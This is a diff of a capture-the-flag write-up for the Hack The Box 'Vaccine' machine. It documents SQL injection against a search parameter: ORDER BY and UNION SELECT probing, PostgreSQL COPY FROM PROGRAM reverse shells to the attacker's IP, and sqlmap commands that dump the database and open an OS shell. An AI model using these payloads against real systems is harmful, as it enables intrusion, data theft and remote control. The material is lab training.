@@ -52,21 +52,63 @@
 when i search for 'a' i can see that url changes to http://10.10.10.46/dashboard.php?search=a when i try to insert quots i get an error:
 
 	ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
-// now we can see that the server is vulnerable for sql injection, from now there is few ways to achive a shell
-### First way(Exploit sql injection)
+// now we can see that the server is vulnerable for sql injection
+source: https://portswigger.net/web-security/sql-injection/union-attacks
+// when we got the Error 
+	
+	ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
+// we can see that we have a table called 'cars', to find how many columns are in that table we can inject :
+
+	' ORDER BY 1--
+// and increase the number(1 to 2 and 3 ...) 
+// all works till ' ORDER BY 5--
+
+	ERROR: syntax error at or near "BY5" LINE 1: Select * from cars where name ilike '%' ORDER BY5--%' ^
+// now we will submitting a series of UNION SELECT payloads specifying a different number of null
+
+    ' UNION SELECT 'a', NULL, NULL, NULL, NULL -- : 
+	ERROR: invalid input syntax for integer: "a" LINE 1: ...ect * from cars where name ilike '%' UNION SELECT 'a', NULL,... ^
+    ' UNION SELECT NULL, 'a', NULL, NULL, NULL -- : VALID
+    ' UNION SELECT NULL, NULL, 'a', NULL, NULL -- : VALID
+    ' UNION SELECT NULL, NULL, NULL, 'a', NULL -- : VALID
+    ' UNION SELECT NULL, NULL, NULL, NULL, 'a' -- : VALID
+
 // Insert:
 
 	' UNION SELECT NULL, NULL, NULL , NULL, VERSION() --
 
 ![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Vaccine/Screenshot_2021-07-31_14_40_43.png)
+// set a listiner
+
+	$ rlwrap nc -lvnp 1444
+// Insert:
+
+	'; CREATE TABLE cmd_exec(cmd_output text); --
+	'; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.16.7/1444 0>&1'''; --
+// we got a shell!
+
+	$ rlwrap nc -lvnp 1444
+	listening on [any] 1444 ...
+	connect to [10.10.16.7] from (UNKNOWN) [10.10.10.46] 41756
+	bash: cannot set terminal process group (11360): Inappropriate ioctl for device
+	bash: no job control in this shell
+	postgres@vaccine:/var/lib/postgresql/11/main$ whoami
+	whoami
+	postgres
+	postgres@vaccine:/var/lib/postgresql/11/main$ 
 
 ![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Vaccine/Screenshot_2021-07-31_13_41_32.png)
 
-sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' 
-	--cookie="PHPSESSID=ikk1tjpq926a0dkboj4hu8r36o" --os-shell
+// There is another way to automate this process with using sqlmap tool
 
-sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=eig0j4h3v77v8prj79sug2hu50" --os-shell
+	$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=eig0j4h3v77v8prj79sug2hu50" --dump-all --tamper=space2comment
+// and then
 
+	sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=eig0j4h3v77v8prj79sug2hu50" --os-shell
+
+
+
+---------------------------------------------------------
 // upgrade connection with nc listiner on port 1234
 bash -c 'bash -i >& /dev/tcp/10.10.16.66/1234 0>&1'
 
